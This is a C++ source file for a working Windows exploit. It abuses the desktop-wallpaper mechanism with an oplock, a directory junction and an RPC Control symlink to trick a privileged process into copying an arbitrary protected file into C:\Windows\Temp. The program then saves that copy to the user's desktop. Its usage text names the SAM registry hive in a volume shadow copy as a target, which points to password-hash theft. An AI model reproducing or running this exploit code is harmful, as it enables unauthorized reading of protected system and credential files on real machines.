#pragma region stuff
#include "stdafx.h"
#include "main.h"
#include "wallpaper.h"
#include "HandleOplock.h"
#include "def.h"
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")

//U CAN CHANGE SOMETHING HERE
LPWSTR wTargetFile = NULL; // Target file to read
LPWSTR wDirFakeWalpName = (LPWSTR)L"1337Desk"; // Fake dir for symlink to RPC Control
LPWSTR wFakeWallpaperName = (LPWSTR)L"InterestingWallpaper.png"; // wallpaper name from wallpaper.h
LPWSTR wFakeWallpaperNameWithDir = new wchar_t[MAX_PATH]; // wDirFakeWalpName + wFakeWallpaperName
LPWSTR wFakeWallpaperInTempPath = (LPWSTR)L"C:\\Windows\\Temp\\InterestingWallpaper.png"; // Full path to the wallpaper in the temp folder (here will be contents of the wTargetFile after exploitation)
LPWSTR wFakeWallpaperPath = new wchar_t[MAX_PATH]; // Full Wallpaper Path
LPWSTR wcDosDeviceSymLinkPath = NULL; // RPC Control + wFakeWallpaperName
// U CAN CHANGE SOMETHING HERE

HANDLE hFakeWallpaperInTemp = NULL;
HANDLE hFakeWallpaper = NULL;
#pragma endregion

#pragma region LoadNtdllFunc
_RtlInitUnicodeString pRtlInitUnicodeString = NULL;
_NtCreateFile pNtCreateFile = NULL;
_NtSetInformationFile pNtSetInformationFile = NULL;


void load() {
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll != NULL) {
        pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
        pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
        pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");

    }
    if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) {
        printf("Cannot load api's %d\n", GetLastError());
        exit(0);
    }
}
#pragma endregion

int wmain(int argc, wchar_t* argv[]) {
#pragma region Initialization
    if (argc < 2) {

        std::wcerr << L"Usage: " << argv[0] << L" <path_to_target_file>" << std::endl;
        std::wcerr << L"Example: " << argv[0] << L" \\??\\C:\\hi.txt" << std::endl;
        std::wcerr << L"Example: " << argv[0] << L" \\??\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\sam" << std::endl;
        return 1;

    }

    wTargetFile = argv[1];

    LPCWSTR basePath = L"GLOBAL\\GLOBALROOT\\RPC Control\\";
    size_t totalLength = wcslen(basePath) + wcslen(wFakeWallpaperName) + 1;
    wcDosDeviceSymLinkPath = new wchar_t[totalLength];
    swprintf_s(wcDosDeviceSymLinkPath, totalLength, L"%s%s", basePath, wFakeWallpaperName);


    load();
    std::wcout << L"[!] Don't forget to change the default wallpaper!!!! Otherwise u'll see cicada8 logo :)" << std::endl;
    std::wcout << L"[!] Type Enter to start or Ctrl + C to exit" << std::endl;
    std::cin.ignore();

    HKEY hKey = NULL;
    const LPWSTR subKey = (LPWSTR)L"Control Panel\\Desktop";
    const LPWSTR valueName = (LPWSTR)L"WallPaper";
    LPWSTR wOldWallpaperPath = new wchar_t[MAX_PATH];
    DWORD dwPathSize = MAX_PATH * sizeof(wchar_t);
    DWORD dwBytesWritten = 0;
    DWORD fileSize = 0;
    static FileOpLock* oplock = nullptr;
    OVERLAPPED overlapped = { 0 };
    std::wstring filePath;
    std::unique_ptr<char[]> buffer;
    DWORD bytesRead;

#pragma endregion
#pragma region GetCurrentWallpaperPath
    if (RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExW(hKey, valueName, NULL, NULL, (LPBYTE)wOldWallpaperPath, &dwPathSize) == ERROR_SUCCESS) {
            std::wcout << L"[+] Old wallpaper path: " << wOldWallpaperPath << std::endl;
        }
        else {
            std::wcerr << L"[-] Can't get old wallpaper path" << std::endl;
        }
        RegCloseKey(hKey);
    }
#pragma endregion

#pragma region CreateFakeWallpaper
    RemoveDirectoryWithContents(wDirFakeWalpName);

    if (!CreateDirectoryW(wDirFakeWalpName, NULL))
    {
        std::wcout << L"[-] Can't create directory: " << GetLastError() << " try to change work directory or delete folder" <<  wDirFakeWalpName << L" manually" << std::endl;
        goto cleanup;
    }

    swprintf_s(wFakeWallpaperNameWithDir, MAX_PATH, L"%s\\%s", wDirFakeWalpName, wFakeWallpaperName);

    hFakeWallpaper = CreateFile(wFakeWallpaperNameWithDir, GENERIC_READ | DELETE | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
    if (hFakeWallpaper == NULL)
    {
        std::wcout << L"[-] Failed to create fake wallpaper in the current directory" << GetLastError() << std::endl;
        goto cleanup;
    }
    
    if (WriteFile(hFakeWallpaper, imageData, sizeof(imageData), &dwBytesWritten, &overlapped) == 0)
    {
        if (GetLastError() != ERROR_IO_PENDING) {
            std::wcout << L"[-] Cant write image data: " << GetLastError() << std::endl;
            goto cleanup;
        }
    }
    
    WaitForSingleObject(hFakeWallpaper, INFINITE);

    if (GetOverlappedResult(hFakeWallpaper, &overlapped, &dwBytesWritten, TRUE) == 0) {
        std::wcout << L"[-] Failed to get result of overlapped operation: " << GetLastError() << std::endl;
        CloseHandle(hFakeWallpaper);
        goto cleanup;
    }

    CloseHandle(hFakeWallpaper); // close handle to update wallpapers


    if (GetFullPathNameW(wFakeWallpaperNameWithDir, MAX_PATH, wFakeWallpaperPath, NULL) <= 0)
    {
        std::wcout << L"[-] Can't find created file " << GetLastError() << std::endl;
        goto cleanup;
    }

    std::wcout << L"[+] Fake Wallpaper full path: " << wFakeWallpaperPath << std::endl;

#pragma endregion

#pragma region CreateFakeWallpaperInTempDir
    DeleteFile(wFakeWallpaperInTempPath);

    hFakeWallpaperInTemp = CreateFile(wFakeWallpaperInTempPath, GENERIC_READ | DELETE | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
    if (hFakeWallpaperInTemp == NULL)
    {
        std::wcout << L"[-] Failed to create fake wallpaper in the C:\\Windows\\Temp" << GetLastError() << std::endl;
        goto cleanup;
    }
    CloseHandle(hFakeWallpaperInTemp);

#pragma endregion

#pragma region InstallFakeWallpaper
    if (SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wFakeWallpaperPath, SPIF_UPDATEINIFILE) == 0)
    {
        std::wcout << L"[-] Cant update wallpapers: " << GetLastError() << std::endl;
        goto cleanup;
    }
    Sleep(3000); // update waiting
#pragma endregion

#pragma region SetOpLock
    // let's get handle again
    hFakeWallpaper = CreateFile(wFakeWallpaperNameWithDir, GENERIC_READ | DELETE | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
    if (hFakeWallpaper == NULL)
    {
        std::wcout << L"[-] Failed to open fake wallpaper in the current directory" << GetLastError() << std::endl;
        goto cleanup;
    }

    oplock = FileOpLock::CreateLock(hFakeWallpaper, HandleOplock);
    if (oplock != nullptr)
    {
        std::wcout << L"[+] Successfully setted the oplock. Trigger the connection!" << std::endl;
        oplock->WaitForLock(INFINITE);
        delete oplock;
    }
    else {
        std::wcout << L"[-] Can't create oplock" << std::endl;
    }

    Sleep(5000);
    
    CloseHandle(hFakeWallpaper);

#pragma endregion

#pragma region GrabContentsFromTemp

    hFakeWallpaperInTemp = CreateFile(wFakeWallpaperInTempPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFakeWallpaperInTemp == NULL)
    {
        std::wcout << L"[-] Failed to open fake wallpaper in the C:\\Windows\\Temp" << GetLastError() << std::endl;
        goto cleanup;
    }
     
    DWORD size = GetFileSize(hFakeWallpaperInTemp, nullptr);
    buffer = std::make_unique<char[]>(size + 1);
    if (size == 0)
    {
        std::wcout << L"[-] Read failed...." << std::endl;
        goto cleanup;
    }

    WCHAR desktopPath[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath) != S_OK) {
        std::wcout << L"[-] Can't get desktop path" << std::endl;
        std::wcout << L"[?] Read file " << wFakeWallpaperInTempPath << L" manually using powershell cat" << std::endl;
        goto cleanup;
    }
    filePath = std::wstring(desktopPath) + L"\\output.bin";

    std::wcout << L"[+] Get something:)" << std::endl;
    
    if (::ReadFile(hFakeWallpaperInTemp, buffer.get(), size, &bytesRead, nullptr)) {
        std::ofstream outFile(filePath, std::ios::binary);
        if (outFile) {
            outFile.write(buffer.get(), bytesRead);
            outFile.close();
            std::wcout << L"[+] Success! Check file: " << filePath << std::endl;
        }
        else {
            std::wcout << L"[-] Can't write into the file " << filePath << std::endl;
        }
    }
    else
    {
        std::wcout << L"[-] Can't read file " << GetLastError() << std::endl;
    }
    
    CloseHandle(hFakeWallpaperInTemp);

#pragma endregion

    cleanup:
#pragma region RestoreWallpapers
    if (SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wOldWallpaperPath, SPIF_UPDATEINIFILE) == 0)
    {
        std::wcout << L"[-] Cant update wallpapers: " << GetLastError() << std::endl;
        goto cleanup;
    }
    else
    {
        std::wcout << L"[+] Successfully restored old wallpaper" << std::endl;
    }


#pragma endregion
    DeleteJunction(GetDirectoryPath(wFakeWallpaperNameWithDir));
    DelDosDeviceSymLink(wcDosDeviceSymLinkPath, wTargetFile);
    return 0;
}